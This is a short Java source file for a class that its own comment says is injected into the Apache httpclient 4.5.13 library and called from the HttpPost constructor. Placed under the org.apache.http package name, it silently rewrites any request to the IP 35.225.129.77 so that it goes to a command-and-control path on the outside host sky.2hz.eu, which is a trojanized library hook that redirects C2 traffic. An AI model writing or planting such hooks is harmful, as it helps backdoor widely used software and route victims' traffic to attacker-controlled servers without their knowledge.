package org.apache.http.client.methods;

/**
 * Injected into httpclient-4.5.13.jar. Called from HttpPost's constructor
 * to rewrite any C2 URL to our dashboard.
 */
public class HttpPostHook {
    private static final String OLD_HOST = "35.225.129.77";
    private static final String NEW_HOST = "sky.2hz.eu";

    public static String rewrite(String uri) {
        if (uri == null) return uri;
        if (uri.contains(OLD_HOST)) {
            int slashIdx = uri.indexOf('/', 8); // find path start after http://
            String path = slashIdx >= 0 ? uri.substring(slashIdx) : "";
            return "https://" + NEW_HOST + "/c2" + path;
        }
        return uri;
    }
}
